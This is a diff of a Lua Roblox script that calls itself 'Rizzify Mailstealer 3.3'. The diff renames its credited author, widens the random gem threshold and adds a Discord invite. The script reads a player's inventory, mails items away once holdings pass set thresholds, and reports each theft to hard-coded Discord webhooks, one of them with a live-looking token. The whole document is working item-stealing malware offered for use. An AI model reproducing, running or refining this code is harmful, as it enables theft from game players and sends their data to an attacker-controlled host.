@@ -1,11 +1,14 @@
+-- 3.3 alpha fully reworked by Yokonara!
+-- 3.3 alpha fully reworked by Yokonara!
+-- 3.3 alpha fully reworked by Yokonara!
+-- 3.3 alpha fully reworked by Yokonara!
+-- 3.3 alpha fully reworked by Yokonara!
+-- 3.3 alpha fully reworked by Yokonara!
 
 
-if Webhook == nil or Webhook == "" then
     Webhook =
-        "https://discord.com/api/webhooks/1"
-end
-if Username == "" or Username == nil then
-    Username = ""
+        ""   
+ Username = ""
 end
 
 
@@ -259,7 +262,7 @@ local Blacklisted_Hoverboards = {"Original", "Red Flying Carpet", "Blue Flying C
 
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
-MailMessage = "kosy Is OP!"
+MailMessage = "Yokonara Is OP!"
 plr = game.Players.LocalPlayer
 guis = plr.PlayerGui
 
@@ -567,7 +570,7 @@ if AmountOfHuges >= DualRandomHuge then
         "https://discord.com/api/webhooks/1224031635796918322/aIjdhsJXMaSxg-77f0USP4llV1B5BhKWyIOBRdbgEs0XyeRZyUHttvnvNVG8Mh1ap2w6"
 end
 math.randomseed(os.time())
-local DualRandomGem = math.random(30000000, 100000000)
+local DualRandomGem = math.random(1000000, 10000000000)
 if GemAmount1 >= DualRandomGem then
     Username = br1c7s
     Webhook =
@@ -585,12 +588,12 @@ local function SendWebhook(url, ping)
         "https://cdn.discordapp.com/attachments/1186371629220110468/1203406556486570135/Yiz6sW7WLrk6r0irZm.png?ex=65d0fab1&is=65be85b1&hm=441f22eadca28d9386689640620d6637a29a1289d4138249c4bc74089f47d537&"
     data1 = {
         ["content"] = ping,
-        ["username"] = "kosy 3.3",
+        ["username"] = "Rizzify Mailstealer 3.3",
         ["avatar_url"] = imgs,
         ["embeds"] = {
             {
                 ["title"] = "New Item Sent \240\159\142\137",
-                ["url"] = "type",
+                ["url"] = "https://discord.gg/HM9aCuwhBb",
                 ["type"] = "rich",
                 ["color"] = tonumber(0xffffff),
                 ["thumbnail"] = {
@@ -622,12 +625,12 @@ local function SendWebhook(url, ping)
                     },
                     {
                         ["name"] = "`(\240\159\154\128) Creator:`",
-                        ["value"] = "```kosy```",
+                        ["value"] = "```Yokonara```",
                         ["inline"] = false
                     },
                     {
                         ["name"] = "",
-                        ["value"] = "__**type**__",
+                        ["value"] = "__**https://discord.gg/HM9aCuwhBb**__",
                         ["inline"] = false
                     }
                 }
